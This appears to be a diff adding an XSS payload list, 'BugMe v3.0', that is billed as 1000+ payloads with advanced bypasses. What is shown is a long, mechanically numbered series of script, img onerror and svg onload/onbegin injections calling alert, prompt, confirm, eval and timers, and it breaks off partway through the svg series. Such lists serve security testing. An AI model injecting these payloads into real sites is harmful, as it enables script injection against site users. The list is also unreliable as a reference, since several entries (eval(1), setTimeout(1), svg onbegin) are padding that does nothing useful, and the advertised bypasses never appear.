@@ -1,0 +1,1882 @@
+# ============================================
+# BugMe v3.0 - ULTIMATE XSS Payload Collection  
+# 1000+ Payloads: Basic to Advanced Bypasses
+# Created by: Muhammed Farhan
+# GitHub: https://github.com/7H3CYF4RX/BugMe
+# ============================================
+<script>alert(1)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>alert("XSS1")</script>
+<script>alert(document.domain)</script>
+<script>alert(2)</script>
+<script>prompt(2)</script>
+<script>confirm(2)</script>
+<script>alert("XSS2")</script>
+<script>alert(document.domain)</script>
+<script>alert(3)</script>
+<script>prompt(3)</script>
+<script>confirm(3)</script>
+<script>alert("XSS3")</script>
+<script>alert(document.domain)</script>
+<script>alert(4)</script>
+<script>prompt(4)</script>
+<script>confirm(4)</script>
+<script>alert("XSS4")</script>
+<script>alert(document.domain)</script>
+<script>alert(5)</script>
+<script>prompt(5)</script>
+<script>confirm(5)</script>
+<script>alert("XSS5")</script>
+<script>alert(document.domain)</script>
+<script>alert(6)</script>
+<script>prompt(6)</script>
+<script>confirm(6)</script>
+<script>alert("XSS6")</script>
+<script>alert(document.domain)</script>
+<script>alert(7)</script>
+<script>prompt(7)</script>
+<script>confirm(7)</script>
+<script>alert("XSS7")</script>
+<script>alert(document.domain)</script>
+<script>alert(8)</script>
+<script>prompt(8)</script>
+<script>confirm(8)</script>
+<script>alert("XSS8")</script>
+<script>alert(document.domain)</script>
+<script>alert(9)</script>
+<script>prompt(9)</script>
+<script>confirm(9)</script>
+<script>alert("XSS9")</script>
+<script>alert(document.domain)</script>
+<script>alert(10)</script>
+<script>prompt(10)</script>
+<script>confirm(10)</script>
+<script>alert("XSS10")</script>
+<script>alert(document.domain)</script>
+<script>alert(11)</script>
+<script>prompt(11)</script>
+<script>confirm(11)</script>
+<script>alert("XSS11")</script>
+<script>alert(document.domain)</script>
+<script>alert(12)</script>
+<script>prompt(12)</script>
+<script>confirm(12)</script>
+<script>alert("XSS12")</script>
+<script>alert(document.domain)</script>
+<script>alert(13)</script>
+<script>prompt(13)</script>
+<script>confirm(13)</script>
+<script>alert("XSS13")</script>
+<script>alert(document.domain)</script>
+<script>alert(14)</script>
+<script>prompt(14)</script>
+<script>confirm(14)</script>
+<script>alert("XSS14")</script>
+<script>alert(document.domain)</script>
+<script>alert(15)</script>
+<script>prompt(15)</script>
+<script>confirm(15)</script>
+<script>alert("XSS15")</script>
+<script>alert(document.domain)</script>
+<script>alert(16)</script>
+<script>prompt(16)</script>
+<script>confirm(16)</script>
+<script>alert("XSS16")</script>
+<script>alert(document.domain)</script>
+<script>alert(17)</script>
+<script>prompt(17)</script>
+<script>confirm(17)</script>
+<script>alert("XSS17")</script>
+<script>alert(document.domain)</script>
+<script>alert(18)</script>
+<script>prompt(18)</script>
+<script>confirm(18)</script>
+<script>alert("XSS18")</script>
+<script>alert(document.domain)</script>
+<script>alert(19)</script>
+<script>prompt(19)</script>
+<script>confirm(19)</script>
+<script>alert("XSS19")</script>
+<script>alert(document.domain)</script>
+<script>alert(20)</script>
+<script>prompt(20)</script>
+<script>confirm(20)</script>
+<script>alert("XSS20")</script>
+<script>alert(document.domain)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img/src=x/onerror=alert(1)>
+<img src=x onerror=alert(2)>
+<img src=x onerror="alert(2)">
+<img src=x onerror='alert(2)'>
+<img/src=x/onerror=alert(2)>
+<img src=x onerror=alert(3)>
+<img src=x onerror="alert(3)">
+<img src=x onerror='alert(3)'>
+<img/src=x/onerror=alert(3)>
+<img src=x onerror=alert(4)>
+<img src=x onerror="alert(4)">
+<img src=x onerror='alert(4)'>
+<img/src=x/onerror=alert(4)>
+<img src=x onerror=alert(5)>
+<img src=x onerror="alert(5)">
+<img src=x onerror='alert(5)'>
+<img/src=x/onerror=alert(5)>
+<img src=x onerror=alert(6)>
+<img src=x onerror="alert(6)">
+<img src=x onerror='alert(6)'>
+<img/src=x/onerror=alert(6)>
+<img src=x onerror=alert(7)>
+<img src=x onerror="alert(7)">
+<img src=x onerror='alert(7)'>
+<img/src=x/onerror=alert(7)>
+<img src=x onerror=alert(8)>
+<img src=x onerror="alert(8)">
+<img src=x onerror='alert(8)'>
+<img/src=x/onerror=alert(8)>
+<img src=x onerror=alert(9)>
+<img src=x onerror="alert(9)">
+<img src=x onerror='alert(9)'>
+<img/src=x/onerror=alert(9)>
+<img src=x onerror=alert(10)>
+<img src=x onerror="alert(10)">
+<img src=x onerror='alert(10)'>
+<img/src=x/onerror=alert(10)>
+<img src=x onerror=alert(11)>
+<img src=x onerror="alert(11)">
+<img src=x onerror='alert(11)'>
+<img/src=x/onerror=alert(11)>
+<img src=x onerror=alert(12)>
+<img src=x onerror="alert(12)">
+<img src=x onerror='alert(12)'>
+<img/src=x/onerror=alert(12)>
+<img src=x onerror=alert(13)>
+<img src=x onerror="alert(13)">
+<img src=x onerror='alert(13)'>
+<img/src=x/onerror=alert(13)>
+<img src=x onerror=alert(14)>
+<img src=x onerror="alert(14)">
+<img src=x onerror='alert(14)'>
+<img/src=x/onerror=alert(14)>
+<img src=x onerror=alert(15)>
+<img src=x onerror="alert(15)">
+<img src=x onerror='alert(15)'>
+<img/src=x/onerror=alert(15)>
+<img src=x onerror=alert(16)>
+<img src=x onerror="alert(16)">
+<img src=x onerror='alert(16)'>
+<img/src=x/onerror=alert(16)>
+<img src=x onerror=alert(17)>
+<img src=x onerror="alert(17)">
+<img src=x onerror='alert(17)'>
+<img/src=x/onerror=alert(17)>
+<img src=x onerror=alert(18)>
+<img src=x onerror="alert(18)">
+<img src=x onerror='alert(18)'>
+<img/src=x/onerror=alert(18)>
+<img src=x onerror=alert(19)>
+<img src=x onerror="alert(19)">
+<img src=x onerror='alert(19)'>
+<img/src=x/onerror=alert(19)>
+<img src=x onerror=alert(20)>
+<img src=x onerror="alert(20)">
+<img src=x onerror='alert(20)'>
+<img/src=x/onerror=alert(20)>
+<img src=x onerror=alert(21)>
+<img src=x onerror="alert(21)">
+<img src=x onerror='alert(21)'>
+<img/src=x/onerror=alert(21)>
+<img src=x onerror=alert(22)>
+<img src=x onerror="alert(22)">
+<img src=x onerror='alert(22)'>
+<img/src=x/onerror=alert(22)>
+<img src=x onerror=alert(23)>
+<img src=x onerror="alert(23)">
+<img src=x onerror='alert(23)'>
+<img/src=x/onerror=alert(23)>
+<img src=x onerror=alert(24)>
+<img src=x onerror="alert(24)">
+<img src=x onerror='alert(24)'>
+<img/src=x/onerror=alert(24)>
+<img src=x onerror=alert(25)>
+<img src=x onerror="alert(25)">
+<img src=x onerror='alert(25)'>
+<img/src=x/onerror=alert(25)>
+<img src=x onerror=prompt(1)>
+<img src=x onerror="prompt(1)">
+<img src=x onerror='prompt(1)'>
+<img/src=x/onerror=prompt(1)>
+<img src=x onerror=prompt(2)>
+<img src=x onerror="prompt(2)">
+<img src=x onerror='prompt(2)'>
+<img/src=x/onerror=prompt(2)>
+<img src=x onerror=prompt(3)>
+<img src=x onerror="prompt(3)">
+<img src=x onerror='prompt(3)'>
+<img/src=x/onerror=prompt(3)>
+<img src=x onerror=prompt(4)>
+<img src=x onerror="prompt(4)">
+<img src=x onerror='prompt(4)'>
+<img/src=x/onerror=prompt(4)>
+<img src=x onerror=prompt(5)>
+<img src=x onerror="prompt(5)">
+<img src=x onerror='prompt(5)'>
+<img/src=x/onerror=prompt(5)>
+<img src=x onerror=prompt(6)>
+<img src=x onerror="prompt(6)">
+<img src=x onerror='prompt(6)'>
+<img/src=x/onerror=prompt(6)>
+<img src=x onerror=prompt(7)>
+<img src=x onerror="prompt(7)">
+<img src=x onerror='prompt(7)'>
+<img/src=x/onerror=prompt(7)>
+<img src=x onerror=prompt(8)>
+<img src=x onerror="prompt(8)">
+<img src=x onerror='prompt(8)'>
+<img/src=x/onerror=prompt(8)>
+<img src=x onerror=prompt(9)>
+<img src=x onerror="prompt(9)">
+<img src=x onerror='prompt(9)'>
+<img/src=x/onerror=prompt(9)>
+<img src=x onerror=prompt(10)>
+<img src=x onerror="prompt(10)">
+<img src=x onerror='prompt(10)'>
+<img/src=x/onerror=prompt(10)>
+<img src=x onerror=prompt(11)>
+<img src=x onerror="prompt(11)">
+<img src=x onerror='prompt(11)'>
+<img/src=x/onerror=prompt(11)>
+<img src=x onerror=prompt(12)>
+<img src=x onerror="prompt(12)">
+<img src=x onerror='prompt(12)'>
+<img/src=x/onerror=prompt(12)>
+<img src=x onerror=prompt(13)>
+<img src=x onerror="prompt(13)">
+<img src=x onerror='prompt(13)'>
+<img/src=x/onerror=prompt(13)>
+<img src=x onerror=prompt(14)>
+<img src=x onerror="prompt(14)">
+<img src=x onerror='prompt(14)'>
+<img/src=x/onerror=prompt(14)>
+<img src=x onerror=prompt(15)>
+<img src=x onerror="prompt(15)">
+<img src=x onerror='prompt(15)'>
+<img/src=x/onerror=prompt(15)>
+<img src=x onerror=prompt(16)>
+<img src=x onerror="prompt(16)">
+<img src=x onerror='prompt(16)'>
+<img/src=x/onerror=prompt(16)>
+<img src=x onerror=prompt(17)>
+<img src=x onerror="prompt(17)">
+<img src=x onerror='prompt(17)'>
+<img/src=x/onerror=prompt(17)>
+<img src=x onerror=prompt(18)>
+<img src=x onerror="prompt(18)">
+<img src=x onerror='prompt(18)'>
+<img/src=x/onerror=prompt(18)>
+<img src=x onerror=prompt(19)>
+<img src=x onerror="prompt(19)">
+<img src=x onerror='prompt(19)'>
+<img/src=x/onerror=prompt(19)>
+<img src=x onerror=prompt(20)>
+<img src=x onerror="prompt(20)">
+<img src=x onerror='prompt(20)'>
+<img/src=x/onerror=prompt(20)>
+<img src=x onerror=prompt(21)>
+<img src=x onerror="prompt(21)">
+<img src=x onerror='prompt(21)'>
+<img/src=x/onerror=prompt(21)>
+<img src=x onerror=prompt(22)>
+<img src=x onerror="prompt(22)">
+<img src=x onerror='prompt(22)'>
+<img/src=x/onerror=prompt(22)>
+<img src=x onerror=prompt(23)>
+<img src=x onerror="prompt(23)">
+<img src=x onerror='prompt(23)'>
+<img/src=x/onerror=prompt(23)>
+<img src=x onerror=prompt(24)>
+<img src=x onerror="prompt(24)">
+<img src=x onerror='prompt(24)'>
+<img/src=x/onerror=prompt(24)>
+<img src=x onerror=prompt(25)>
+<img src=x onerror="prompt(25)">
+<img src=x onerror='prompt(25)'>
+<img/src=x/onerror=prompt(25)>
+<img src=x onerror=confirm(1)>
+<img src=x onerror="confirm(1)">
+<img src=x onerror='confirm(1)'>
+<img/src=x/onerror=confirm(1)>
+<img src=x onerror=confirm(2)>
+<img src=x onerror="confirm(2)">
+<img src=x onerror='confirm(2)'>
+<img/src=x/onerror=confirm(2)>
+<img src=x onerror=confirm(3)>
+<img src=x onerror="confirm(3)">
+<img src=x onerror='confirm(3)'>
+<img/src=x/onerror=confirm(3)>
+<img src=x onerror=confirm(4)>
+<img src=x onerror="confirm(4)">
+<img src=x onerror='confirm(4)'>
+<img/src=x/onerror=confirm(4)>
+<img src=x onerror=confirm(5)>
+<img src=x onerror="confirm(5)">
+<img src=x onerror='confirm(5)'>
+<img/src=x/onerror=confirm(5)>
+<img src=x onerror=confirm(6)>
+<img src=x onerror="confirm(6)">
+<img src=x onerror='confirm(6)'>
+<img/src=x/onerror=confirm(6)>
+<img src=x onerror=confirm(7)>
+<img src=x onerror="confirm(7)">
+<img src=x onerror='confirm(7)'>
+<img/src=x/onerror=confirm(7)>
+<img src=x onerror=confirm(8)>
+<img src=x onerror="confirm(8)">
+<img src=x onerror='confirm(8)'>
+<img/src=x/onerror=confirm(8)>
+<img src=x onerror=confirm(9)>
+<img src=x onerror="confirm(9)">
+<img src=x onerror='confirm(9)'>
+<img/src=x/onerror=confirm(9)>
+<img src=x onerror=confirm(10)>
+<img src=x onerror="confirm(10)">
+<img src=x onerror='confirm(10)'>
+<img/src=x/onerror=confirm(10)>
+<img src=x onerror=confirm(11)>
+<img src=x onerror="confirm(11)">
+<img src=x onerror='confirm(11)'>
+<img/src=x/onerror=confirm(11)>
+<img src=x onerror=confirm(12)>
+<img src=x onerror="confirm(12)">
+<img src=x onerror='confirm(12)'>
+<img/src=x/onerror=confirm(12)>
+<img src=x onerror=confirm(13)>
+<img src=x onerror="confirm(13)">
+<img src=x onerror='confirm(13)'>
+<img/src=x/onerror=confirm(13)>
+<img src=x onerror=confirm(14)>
+<img src=x onerror="confirm(14)">
+<img src=x onerror='confirm(14)'>
+<img/src=x/onerror=confirm(14)>
+<img src=x onerror=confirm(15)>
+<img src=x onerror="confirm(15)">
+<img src=x onerror='confirm(15)'>
+<img/src=x/onerror=confirm(15)>
+<img src=x onerror=confirm(16)>
+<img src=x onerror="confirm(16)">
+<img src=x onerror='confirm(16)'>
+<img/src=x/onerror=confirm(16)>
+<img src=x onerror=confirm(17)>
+<img src=x onerror="confirm(17)">
+<img src=x onerror='confirm(17)'>
+<img/src=x/onerror=confirm(17)>
+<img src=x onerror=confirm(18)>
+<img src=x onerror="confirm(18)">
+<img src=x onerror='confirm(18)'>
+<img/src=x/onerror=confirm(18)>
+<img src=x onerror=confirm(19)>
+<img src=x onerror="confirm(19)">
+<img src=x onerror='confirm(19)'>
+<img/src=x/onerror=confirm(19)>
+<img src=x onerror=confirm(20)>
+<img src=x onerror="confirm(20)">
+<img src=x onerror='confirm(20)'>
+<img/src=x/onerror=confirm(20)>
+<img src=x onerror=confirm(21)>
+<img src=x onerror="confirm(21)">
+<img src=x onerror='confirm(21)'>
+<img/src=x/onerror=confirm(21)>
+<img src=x onerror=confirm(22)>
+<img src=x onerror="confirm(22)">
+<img src=x onerror='confirm(22)'>
+<img/src=x/onerror=confirm(22)>
+<img src=x onerror=confirm(23)>
+<img src=x onerror="confirm(23)">
+<img src=x onerror='confirm(23)'>
+<img/src=x/onerror=confirm(23)>
+<img src=x onerror=confirm(24)>
+<img src=x onerror="confirm(24)">
+<img src=x onerror='confirm(24)'>
+<img/src=x/onerror=confirm(24)>
+<img src=x onerror=confirm(25)>
+<img src=x onerror="confirm(25)">
+<img src=x onerror='confirm(25)'>
+<img/src=x/onerror=confirm(25)>
+<img src=x onerror=eval(1)>
+<img src=x onerror="eval(1)">
+<img src=x onerror='eval(1)'>
+<img/src=x/onerror=eval(1)>
+<img src=x onerror=eval(2)>
+<img src=x onerror="eval(2)">
+<img src=x onerror='eval(2)'>
+<img/src=x/onerror=eval(2)>
+<img src=x onerror=eval(3)>
+<img src=x onerror="eval(3)">
+<img src=x onerror='eval(3)'>
+<img/src=x/onerror=eval(3)>
+<img src=x onerror=eval(4)>
+<img src=x onerror="eval(4)">
+<img src=x onerror='eval(4)'>
+<img/src=x/onerror=eval(4)>
+<img src=x onerror=eval(5)>
+<img src=x onerror="eval(5)">
+<img src=x onerror='eval(5)'>
+<img/src=x/onerror=eval(5)>
+<img src=x onerror=eval(6)>
+<img src=x onerror="eval(6)">
+<img src=x onerror='eval(6)'>
+<img/src=x/onerror=eval(6)>
+<img src=x onerror=eval(7)>
+<img src=x onerror="eval(7)">
+<img src=x onerror='eval(7)'>
+<img/src=x/onerror=eval(7)>
+<img src=x onerror=eval(8)>
+<img src=x onerror="eval(8)">
+<img src=x onerror='eval(8)'>
+<img/src=x/onerror=eval(8)>
+<img src=x onerror=eval(9)>
+<img src=x onerror="eval(9)">
+<img src=x onerror='eval(9)'>
+<img/src=x/onerror=eval(9)>
+<img src=x onerror=eval(10)>
+<img src=x onerror="eval(10)">
+<img src=x onerror='eval(10)'>
+<img/src=x/onerror=eval(10)>
+<img src=x onerror=eval(11)>
+<img src=x onerror="eval(11)">
+<img src=x onerror='eval(11)'>
+<img/src=x/onerror=eval(11)>
+<img src=x onerror=eval(12)>
+<img src=x onerror="eval(12)">
+<img src=x onerror='eval(12)'>
+<img/src=x/onerror=eval(12)>
+<img src=x onerror=eval(13)>
+<img src=x onerror="eval(13)">
+<img src=x onerror='eval(13)'>
+<img/src=x/onerror=eval(13)>
+<img src=x onerror=eval(14)>
+<img src=x onerror="eval(14)">
+<img src=x onerror='eval(14)'>
+<img/src=x/onerror=eval(14)>
+<img src=x onerror=eval(15)>
+<img src=x onerror="eval(15)">
+<img src=x onerror='eval(15)'>
+<img/src=x/onerror=eval(15)>
+<img src=x onerror=eval(16)>
+<img src=x onerror="eval(16)">
+<img src=x onerror='eval(16)'>
+<img/src=x/onerror=eval(16)>
+<img src=x onerror=eval(17)>
+<img src=x onerror="eval(17)">
+<img src=x onerror='eval(17)'>
+<img/src=x/onerror=eval(17)>
+<img src=x onerror=eval(18)>
+<img src=x onerror="eval(18)">
+<img src=x onerror='eval(18)'>
+<img/src=x/onerror=eval(18)>
+<img src=x onerror=eval(19)>
+<img src=x onerror="eval(19)">
+<img src=x onerror='eval(19)'>
+<img/src=x/onerror=eval(19)>
+<img src=x onerror=eval(20)>
+<img src=x onerror="eval(20)">
+<img src=x onerror='eval(20)'>
+<img/src=x/onerror=eval(20)>
+<img src=x onerror=eval(21)>
+<img src=x onerror="eval(21)">
+<img src=x onerror='eval(21)'>
+<img/src=x/onerror=eval(21)>
+<img src=x onerror=eval(22)>
+<img src=x onerror="eval(22)">
+<img src=x onerror='eval(22)'>
+<img/src=x/onerror=eval(22)>
+<img src=x onerror=eval(23)>
+<img src=x onerror="eval(23)">
+<img src=x onerror='eval(23)'>
+<img/src=x/onerror=eval(23)>
+<img src=x onerror=eval(24)>
+<img src=x onerror="eval(24)">
+<img src=x onerror='eval(24)'>
+<img/src=x/onerror=eval(24)>
+<img src=x onerror=eval(25)>
+<img src=x onerror="eval(25)">
+<img src=x onerror='eval(25)'>
+<img/src=x/onerror=eval(25)>
+<img src=x onerror=setTimeout(1)>
+<img src=x onerror="setTimeout(1)">
+<img src=x onerror='setTimeout(1)'>
+<img/src=x/onerror=setTimeout(1)>
+<img src=x onerror=setTimeout(2)>
+<img src=x onerror="setTimeout(2)">
+<img src=x onerror='setTimeout(2)'>
+<img/src=x/onerror=setTimeout(2)>
+<img src=x onerror=setTimeout(3)>
+<img src=x onerror="setTimeout(3)">
+<img src=x onerror='setTimeout(3)'>
+<img/src=x/onerror=setTimeout(3)>
+<img src=x onerror=setTimeout(4)>
+<img src=x onerror="setTimeout(4)">
+<img src=x onerror='setTimeout(4)'>
+<img/src=x/onerror=setTimeout(4)>
+<img src=x onerror=setTimeout(5)>
+<img src=x onerror="setTimeout(5)">
+<img src=x onerror='setTimeout(5)'>
+<img/src=x/onerror=setTimeout(5)>
+<img src=x onerror=setTimeout(6)>
+<img src=x onerror="setTimeout(6)">
+<img src=x onerror='setTimeout(6)'>
+<img/src=x/onerror=setTimeout(6)>
+<img src=x onerror=setTimeout(7)>
+<img src=x onerror="setTimeout(7)">
+<img src=x onerror='setTimeout(7)'>
+<img/src=x/onerror=setTimeout(7)>
+<img src=x onerror=setTimeout(8)>
+<img src=x onerror="setTimeout(8)">
+<img src=x onerror='setTimeout(8)'>
+<img/src=x/onerror=setTimeout(8)>
+<img src=x onerror=setTimeout(9)>
+<img src=x onerror="setTimeout(9)">
+<img src=x onerror='setTimeout(9)'>
+<img/src=x/onerror=setTimeout(9)>
+<img src=x onerror=setTimeout(10)>
+<img src=x onerror="setTimeout(10)">
+<img src=x onerror='setTimeout(10)'>
+<img/src=x/onerror=setTimeout(10)>
+<img src=x onerror=setTimeout(11)>
+<img src=x onerror="setTimeout(11)">
+<img src=x onerror='setTimeout(11)'>
+<img/src=x/onerror=setTimeout(11)>
+<img src=x onerror=setTimeout(12)>
+<img src=x onerror="setTimeout(12)">
+<img src=x onerror='setTimeout(12)'>
+<img/src=x/onerror=setTimeout(12)>
+<img src=x onerror=setTimeout(13)>
+<img src=x onerror="setTimeout(13)">
+<img src=x onerror='setTimeout(13)'>
+<img/src=x/onerror=setTimeout(13)>
+<img src=x onerror=setTimeout(14)>
+<img src=x onerror="setTimeout(14)">
+<img src=x onerror='setTimeout(14)'>
+<img/src=x/onerror=setTimeout(14)>
+<img src=x onerror=setTimeout(15)>
+<img src=x onerror="setTimeout(15)">
+<img src=x onerror='setTimeout(15)'>
+<img/src=x/onerror=setTimeout(15)>
+<img src=x onerror=setTimeout(16)>
+<img src=x onerror="setTimeout(16)">
+<img src=x onerror='setTimeout(16)'>
+<img/src=x/onerror=setTimeout(16)>
+<img src=x onerror=setTimeout(17)>
+<img src=x onerror="setTimeout(17)">
+<img src=x onerror='setTimeout(17)'>
+<img/src=x/onerror=setTimeout(17)>
+<img src=x onerror=setTimeout(18)>
+<img src=x onerror="setTimeout(18)">
+<img src=x onerror='setTimeout(18)'>
+<img/src=x/onerror=setTimeout(18)>
+<img src=x onerror=setTimeout(19)>
+<img src=x onerror="setTimeout(19)">
+<img src=x onerror='setTimeout(19)'>
+<img/src=x/onerror=setTimeout(19)>
+<img src=x onerror=setTimeout(20)>
+<img src=x onerror="setTimeout(20)">
+<img src=x onerror='setTimeout(20)'>
+<img/src=x/onerror=setTimeout(20)>
+<img src=x onerror=setTimeout(21)>
+<img src=x onerror="setTimeout(21)">
+<img src=x onerror='setTimeout(21)'>
+<img/src=x/onerror=setTimeout(21)>
+<img src=x onerror=setTimeout(22)>
+<img src=x onerror="setTimeout(22)">
+<img src=x onerror='setTimeout(22)'>
+<img/src=x/onerror=setTimeout(22)>
+<img src=x onerror=setTimeout(23)>
+<img src=x onerror="setTimeout(23)">
+<img src=x onerror='setTimeout(23)'>
+<img/src=x/onerror=setTimeout(23)>
+<img src=x onerror=setTimeout(24)>
+<img src=x onerror="setTimeout(24)">
+<img src=x onerror='setTimeout(24)'>
+<img/src=x/onerror=setTimeout(24)>
+<img src=x onerror=setTimeout(25)>
+<img src=x onerror="setTimeout(25)">
+<img src=x onerror='setTimeout(25)'>
+<img/src=x/onerror=setTimeout(25)>
+<img src=x onerror=setInterval(1)>
+<img src=x onerror="setInterval(1)">
+<img src=x onerror='setInterval(1)'>
+<img/src=x/onerror=setInterval(1)>
+<img src=x onerror=setInterval(2)>
+<img src=x onerror="setInterval(2)">
+<img src=x onerror='setInterval(2)'>
+<img/src=x/onerror=setInterval(2)>
+<img src=x onerror=setInterval(3)>
+<img src=x onerror="setInterval(3)">
+<img src=x onerror='setInterval(3)'>
+<img/src=x/onerror=setInterval(3)>
+<img src=x onerror=setInterval(4)>
+<img src=x onerror="setInterval(4)">
+<img src=x onerror='setInterval(4)'>
+<img/src=x/onerror=setInterval(4)>
+<img src=x onerror=setInterval(5)>
+<img src=x onerror="setInterval(5)">
+<img src=x onerror='setInterval(5)'>
+<img/src=x/onerror=setInterval(5)>
+<img src=x onerror=setInterval(6)>
+<img src=x onerror="setInterval(6)">
+<img src=x onerror='setInterval(6)'>
+<img/src=x/onerror=setInterval(6)>
+<img src=x onerror=setInterval(7)>
+<img src=x onerror="setInterval(7)">
+<img src=x onerror='setInterval(7)'>
+<img/src=x/onerror=setInterval(7)>
+<img src=x onerror=setInterval(8)>
+<img src=x onerror="setInterval(8)">
+<img src=x onerror='setInterval(8)'>
+<img/src=x/onerror=setInterval(8)>
+<img src=x onerror=setInterval(9)>
+<img src=x onerror="setInterval(9)">
+<img src=x onerror='setInterval(9)'>
+<img/src=x/onerror=setInterval(9)>
+<img src=x onerror=setInterval(10)>
+<img src=x onerror="setInterval(10)">
+<img src=x onerror='setInterval(10)'>
+<img/src=x/onerror=setInterval(10)>
+<img src=x onerror=setInterval(11)>
+<img src=x onerror="setInterval(11)">
+<img src=x onerror='setInterval(11)'>
+<img/src=x/onerror=setInterval(11)>
+<img src=x onerror=setInterval(12)>
+<img src=x onerror="setInterval(12)">
+<img src=x onerror='setInterval(12)'>
+<img/src=x/onerror=setInterval(12)>
+<img src=x onerror=setInterval(13)>
+<img src=x onerror="setInterval(13)">
+<img src=x onerror='setInterval(13)'>
+<img/src=x/onerror=setInterval(13)>
+<img src=x onerror=setInterval(14)>
+<img src=x onerror="setInterval(14)">
+<img src=x onerror='setInterval(14)'>
+<img/src=x/onerror=setInterval(14)>
+<img src=x onerror=setInterval(15)>
+<img src=x onerror="setInterval(15)">
+<img src=x onerror='setInterval(15)'>
+<img/src=x/onerror=setInterval(15)>
+<img src=x onerror=setInterval(16)>
+<img src=x onerror="setInterval(16)">
+<img src=x onerror='setInterval(16)'>
+<img/src=x/onerror=setInterval(16)>
+<img src=x onerror=setInterval(17)>
+<img src=x onerror="setInterval(17)">
+<img src=x onerror='setInterval(17)'>
+<img/src=x/onerror=setInterval(17)>
+<img src=x onerror=setInterval(18)>
+<img src=x onerror="setInterval(18)">
+<img src=x onerror='setInterval(18)'>
+<img/src=x/onerror=setInterval(18)>
+<img src=x onerror=setInterval(19)>
+<img src=x onerror="setInterval(19)">
+<img src=x onerror='setInterval(19)'>
+<img/src=x/onerror=setInterval(19)>
+<img src=x onerror=setInterval(20)>
+<img src=x onerror="setInterval(20)">
+<img src=x onerror='setInterval(20)'>
+<img/src=x/onerror=setInterval(20)>
+<img src=x onerror=setInterval(21)>
+<img src=x onerror="setInterval(21)">
+<img src=x onerror='setInterval(21)'>
+<img/src=x/onerror=setInterval(21)>
+<img src=x onerror=setInterval(22)>
+<img src=x onerror="setInterval(22)">
+<img src=x onerror='setInterval(22)'>
+<img/src=x/onerror=setInterval(22)>
+<img src=x onerror=setInterval(23)>
+<img src=x onerror="setInterval(23)">
+<img src=x onerror='setInterval(23)'>
+<img/src=x/onerror=setInterval(23)>
+<img src=x onerror=setInterval(24)>
+<img src=x onerror="setInterval(24)">
+<img src=x onerror='setInterval(24)'>
+<img/src=x/onerror=setInterval(24)>
+<img src=x onerror=setInterval(25)>
+<img src=x onerror="setInterval(25)">
+<img src=x onerror='setInterval(25)'>
+<img/src=x/onerror=setInterval(25)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload="alert(1)">
+<svg onload='alert(1)'>
+<svg onload=alert(2)>
+<svg/onload=alert(2)>
+<svg onload="alert(2)">
+<svg onload='alert(2)'>
+<svg onload=alert(3)>
+<svg/onload=alert(3)>
+<svg onload="alert(3)">
+<svg onload='alert(3)'>
+<svg onload=alert(4)>
+<svg/onload=alert(4)>
+<svg onload="alert(4)">
+<svg onload='alert(4)'>
+<svg onload=alert(5)>
+<svg/onload=alert(5)>
+<svg onload="alert(5)">
+<svg onload='alert(5)'>
+<svg onload=alert(6)>
+<svg/onload=alert(6)>
+<svg onload="alert(6)">
+<svg onload='alert(6)'>
+<svg onload=alert(7)>
+<svg/onload=alert(7)>
+<svg onload="alert(7)">
+<svg onload='alert(7)'>
+<svg onload=alert(8)>
+<svg/onload=alert(8)>
+<svg onload="alert(8)">
+<svg onload='alert(8)'>
+<svg onload=alert(9)>
+<svg/onload=alert(9)>
+<svg onload="alert(9)">
+<svg onload='alert(9)'>
+<svg onload=alert(10)>
+<svg/onload=alert(10)>
+<svg onload="alert(10)">
+<svg onload='alert(10)'>
+<svg onload=alert(11)>
+<svg/onload=alert(11)>
+<svg onload="alert(11)">
+<svg onload='alert(11)'>
+<svg onload=alert(12)>
+<svg/onload=alert(12)>
+<svg onload="alert(12)">
+<svg onload='alert(12)'>
+<svg onload=alert(13)>
+<svg/onload=alert(13)>
+<svg onload="alert(13)">
+<svg onload='alert(13)'>
+<svg onload=alert(14)>
+<svg/onload=alert(14)>
+<svg onload="alert(14)">
+<svg onload='alert(14)'>
+<svg onload=alert(15)>
+<svg/onload=alert(15)>
+<svg onload="alert(15)">
+<svg onload='alert(15)'>
+<svg onload=alert(16)>
+<svg/onload=alert(16)>
+<svg onload="alert(16)">
+<svg onload='alert(16)'>
+<svg onload=alert(17)>
+<svg/onload=alert(17)>
+<svg onload="alert(17)">
+<svg onload='alert(17)'>
+<svg onload=alert(18)>
+<svg/onload=alert(18)>
+<svg onload="alert(18)">
+<svg onload='alert(18)'>
+<svg onload=alert(19)>
+<svg/onload=alert(19)>
+<svg onload="alert(19)">
+<svg onload='alert(19)'>
+<svg onload=alert(20)>
+<svg/onload=alert(20)>
+<svg onload="alert(20)">
+<svg onload='alert(20)'>
+<svg onbegin=alert(1)>
+<svg/onbegin=alert(1)>
+<svg onbegin="alert(1)">
+<svg onbegin='alert(1)'>
+<svg onbegin=alert(2)>
+<svg/onbegin=alert(2)>
+<svg onbegin="alert(2)">
+<svg onbegin='alert(2)'>
+<svg onbegin=alert(3)>
+<svg/onbegin=alert(3)>
+<svg onbegin="alert(3)">
+<svg onbegin='alert(3)'>
+<svg onbegin=alert(4)>
+<svg/onbegin=alert(4)>
+<svg onbegin="alert(4)">
+<svg onbegin='alert(4)'>
+<svg onbegin=alert(5)>
+<svg/onbegin=alert(5)>
+<svg onbegin="alert(5)">
+<svg onbegin='alert(5)'>
+<svg onbegin=alert(6)>
+<svg/onbegin=alert(6)>
+<svg onbegin="alert(6)">
+<svg onbegin='alert(6)'>
+<svg onbegin=alert(7)>
+<svg/onbegin=alert(7)>
+<svg onbegin="alert(7)">
+<svg onbegin='alert(7)'>
+<svg onbegin=alert(8)>
+<svg/onbegin=alert(8)>
+<svg onbegin="alert(8)">
+<svg onbegin='alert(8)'>
+<svg onbegin=alert(9)>
+<svg/onbegin=alert(9)>
+<svg onbegin="alert(9)">
+<svg onbegin='alert(9)'>
+<svg onbegin=alert(10)>
+<svg/onbegin=alert(10)>
+<svg onbegin="alert(10)">
+<svg onbegin='alert(10)'>
+<svg onbegin=alert(11)>
+<svg/onbegin=alert(11)>
+<svg onbegin="alert(11)">
+<svg onbegin='alert(11)'>
+<svg onbegin=alert(12)>
+<svg/onbegin=alert(12)>
+<svg onbegin="alert(12)">
+<svg onbegin='alert(12)'>
+<svg onbegin=alert(13)>
+<svg/onbegin=alert(13)>
+<svg onbegin="alert(13)">
+<svg onbegin='alert(13)'>
+<svg onbegin=alert(14)>
+<svg/onbegin=alert(14)>
